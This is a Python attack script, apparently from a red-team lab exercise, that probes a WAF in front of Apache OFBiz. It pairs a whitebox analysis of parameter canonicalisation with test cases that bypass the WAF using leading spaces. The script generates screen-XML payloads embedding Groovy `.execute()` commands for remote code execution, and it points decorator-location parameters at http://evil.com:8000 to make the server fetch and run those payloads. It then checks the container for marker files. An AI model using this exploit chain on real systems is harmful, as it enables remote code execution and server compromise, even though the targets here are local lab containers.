# -*- coding: utf-8 -*-
"""RT-3 攻击矩阵：对加固后 WAF(3003/3005/3006) 的绕过变体逐一实测。

核心白盒依据（ofbiz 容器 /usr/src/apache-ofbiz 源码，只读核查）：
- UtilHttp.getParameterMap() -> canonicalizeParameterMap():
    value.split(" ") -> 逐块处理 -> 重新拼接 -> trim()
    => 参数值的前导空格被整体吃掉（split 产生空块、join+trim 归零）。
- ScreenRenderer.populateContextForRequest(): screen 上下文 parameters
    = UtilHttp.getCombinedMap(request) -> getParameterMap() => 上面那个规范化后的 map。
- FlexibleLocation.resolveLocation(): 按"第一个冒号前"查 resolver（无 trim），
    但收到的是已去空格的值 => "   http://evil.com/..." 照常远程解析。
- WAF 3005/3006 正则 (?i)^(?:[a-z][a-z0-9+.\-]*:|//) 锚定"值开头"，t:urlDecodeUni
    不影响空格 => "   http://..." 不命中。
"""
import io
import os
import subprocess
import sys
import time

import requests
import urllib3

urllib3.disable_warnings()

HERE = os.path.dirname(os.path.abspath(__file__))
LAB = os.path.normpath(os.path.join(HERE, "..", ".."))
WWW = os.path.join(LAB, "infrastructure", "www", "payloads")
WAF = "https://127.0.0.1:18381"
DIRECT = "https://127.0.0.1:18081"  # 仅对照，不用于最终攻击

S = requests.Session()
S.trust_env = False
S.verify = False
S.headers["User-Agent"] = "Mozilla/5.0"


def make_payload(screen_name, fname, groovy=None):
    """groovy=None 生成良性探针（无执行）；否则嵌入 ${groovy:...}。"""
    action = ('<set value="${groovy:%s}"/>' % groovy) if groovy \
        else '<set value="rt3-benign-probe"/>'
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
        '        xmlns="http://ofbiz.apache.org/Widget-Screen"'
        ' xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen'
        ' http://ofbiz.apache.org/dtds/widget-screen.xsd">\n'
        '    <screen name="%s">\n'
        '        <section>\n'
        '            <actions>\n'
        '                %s\n'
        '            </actions>\n'
        '        </section>\n'
        '    </screen>\n'
        '</screens>\n' % (screen_name, action)
    )
    io.open(os.path.join(WWW, fname), "w", encoding="utf-8", newline="\n").write(xml)
    return fname


def send(uri, param, raw_value, base=WAF, timeout=40):
    """raw_value 按 form-urlencode 手工编码（空格->%20，保持两侧解码一致）。"""
    from urllib.parse import quote
    body = param + "=" + quote(raw_value, safe="")
    r = S.post(base + uri, data=body,
               headers={"Content-Type": "application/x-www-form-urlencoded"},
               timeout=timeout, allow_redirects=False)
    return r


def truth():
    tmp = subprocess.run(["docker", "exec", "multi-round-lab-ofbiz-1", "ls", "-l",
                          "--full-time", "/tmp"], capture_output=True, text=True).stdout
    log = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "3m"],
                         capture_output=True, text=True)
    return tmp, log.stdout + log.stderr


if __name__ == "__main__":
    # ---- 载荷生成（全部新文件名，避免与旧轮痕迹混淆）----
    make_payload("TemporalExpressionDecorator", "rt3_old.xml")                 # T1 旧绕过复测（良性）
    make_payload("TemporalExpressionDecorator", "rt3_probe_t.xml")             # T2 前导空格探针（良性）
    make_payload("TemporalExpressionDecorator", "rt3_pwn_t.xml",
                 groovy="'touch /tmp/pwn_rt3_temporal'.execute();")            # T3 RCE
    make_payload("StatsDecorator", "rt3_pwn_s.xml",
                 groovy="'touch /tmp/pwn_rt3_stats'.execute();")               # T4 RCE
    make_payload("TemporalExpressionDecorator", "rt3_probe_pr.xml")            # T7 协议相对探针（良性）
    make_payload("TemporalExpressionDecorator", "rt3_probe_tab.xml")           # T5 前导 TAB 探针（良性）
    make_payload("StatsDecorator", "rt3_probe_fp.xml")                         # T6 裸 forgotPassword 探针（良性）

    tests = [
        # (编号, uri, 参数名, 参数值(原始, 未编码), 载荷路径, 说明)
        ("T1", "/webtools/control/main/findTemporalExpression",
         "tempExprDecoratorLocation", "http://evil.com:8000/payloads/rt3_old.xml",
         "/payloads/rt3_old.xml", "旧绕过复测：scheme 顶格（预期 3005 拦）"),
        ("T2", "/webtools/control/main/findTemporalExpression",
         "tempExprDecoratorLocation", "   http://evil.com:8000/payloads/rt3_probe_t.xml",
         "/payloads/rt3_probe_t.xml", "前导空格探针：canonicalize 吃空格（预期放行+SSRF）"),
        ("T3", "/webtools/control/main/findTemporalExpression",
         "tempExprDecoratorLocation", "   http://evil.com:8000/payloads/rt3_pwn_t.xml",
         "/payloads/rt3_pwn_t.xml", "前导空格 RCE（真值 a：/tmp/pwn_rt3_temporal）"),
        ("T4", "/webtools/control/forgotPassword/StatsSinceStart",
         "statsDecoratorLocation", "  http://evil.com:8000/payloads/rt3_pwn_s.xml",
         "/payloads/rt3_pwn_s.xml", "姊妹路由+空格 RCE（真值 a：/tmp/pwn_rt3_stats）"),
        ("T7", "/webtools/control/main/findTemporalExpression",
         "tempExprDecoratorLocation", "   //evil.com:8000/payloads/rt3_probe_pr.xml",
         "/payloads/rt3_probe_pr.xml", "前导空格+协议相对（应用侧是否解析）"),
        ("T5", "/webtools/control/main/findTemporalExpression",
         "tempExprDecoratorLocation", "\thttp://evil.com:8000/payloads/rt3_probe_tab.xml",
         "/payloads/rt3_probe_tab.xml", "前导 TAB：canonicalize 只 split(\" \")，TAB 保留（预期不 fetch）"),
        ("T6", "/webtools/control/forgotPassword",
         "statsDecoratorLocation", "  http://evil.com:8000/payloads/rt3_probe_fp.xml",
         "/payloads/rt3_probe_fp.xml", "裸 forgotPassword：无参数化装饰器（预期不 fetch，负知识）"),
    ]
    which = sys.argv[1:] or [t[0] for t in tests]
    for tid, uri, param, val, path, note in tests:
        if tid not in which:
            continue
        r = send(uri, param, val)
        time.sleep(2)
        tmp, log = truth()
        fetched = path in log
        marker_hint = ("pwn_rt3_temporal" in tmp) or ("pwn_rt3_stats" in tmp)
        print("[%s] %s\n    URI=%s  %s=%r\n    -> HTTP %s (%dB)\n    真值: infra收到该载荷GET=%s  /tmp新标记=%s"
              % (tid, note, uri, param, val, r.status_code, len(r.content), fetched, marker_hint))
        print("-" * 72)
